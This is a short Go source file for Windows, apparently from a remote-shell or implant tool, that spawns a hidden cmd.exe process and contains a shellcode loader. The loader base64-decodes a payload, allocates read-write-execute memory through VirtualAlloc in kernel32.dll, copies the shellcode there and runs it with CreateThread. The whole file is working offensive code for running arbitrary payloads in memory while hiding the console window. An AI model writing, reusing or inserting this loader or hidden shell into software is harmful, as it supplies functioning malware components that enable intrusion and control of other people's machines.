//go:build windows || !linux || !darwin || !freebsd
// +build windows !linux !darwin !freebsd

package shell

import (
	"encoding/base64"
	"os/exec"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT  = 0x1000
	MEM_RESERVE = 0x2000
)

// TODO make this work again through iShell, for now just execute cmds
func GetShell() *exec.Cmd {
	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd
}

// InjectShellcode decodes a base64 encoded shellcode and calls ExecShellcode on the decode value.
func InjectShellcode(encShellcode string) {
	if encShellcode != "" {
		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
			go ExecShellcode(shellcode)
		}
	}
}

// ExecShellcode maps a memory page as RWX, copies the provided shellcode to it
// and executes it via a syscall.Syscall call.
func ExecShellcode(shellcode []byte) {
	// Resolve kernell32.dll, and VirtualAlloc
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	procCreateThread := kernel32.MustFindProc("CreateThread")
	// Reserve space to drop shellcode
	address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
	// Ugly, but works
	addrPtr := (*[999000]byte)(unsafe.Pointer(address))
	// Copy shellcode
	for i, value := range shellcode {
		addrPtr[i] = value
	}
	procCreateThread.Call(0, 0, address, 0, 0, 0)
}
